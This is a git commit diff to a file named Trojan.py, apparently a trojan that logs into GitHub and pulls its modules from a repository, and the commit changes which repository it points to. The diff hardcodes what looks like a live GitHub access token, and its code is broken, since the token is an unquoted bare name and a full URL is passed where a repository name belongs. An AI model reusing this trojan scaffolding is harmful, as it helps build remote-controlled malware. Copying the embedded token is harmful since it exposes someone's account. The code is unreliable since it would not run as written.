2aaf304cc0b9068e50c19ac9e0cc203e74c6f8aa
RealIrox100 <superstarfart02@gmail.com>
2026-09-24 15:56:34 -0400

    Change repository reference in Trojan.py
    Updated repository URL to point to 'Funtime-Stuff'.

--- Trojan.py
+++ Trojan.py
@@ -15,7 +15,7 @@ def github_connect():
         token = f.read().strip()
     user = 'RealIrox100'  # GitHub username
     sess = github3.login(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)  # Login to GitHub using the token
-    return sess.repository(user, 'nameofyourrepo')  # Return the specific repository 'Trojan'
+    return sess.repository(user, 'https://github.com/RealIrox100/Funtime-Stuff')  # Return the specific repository 'Trojan'
 # Function to retrieve the contents of a file from a specific directory in the GitHub repository
 def get_file_contents(dirname, module_name, repo):
     # Fetch the file contents from the specified directory and module name
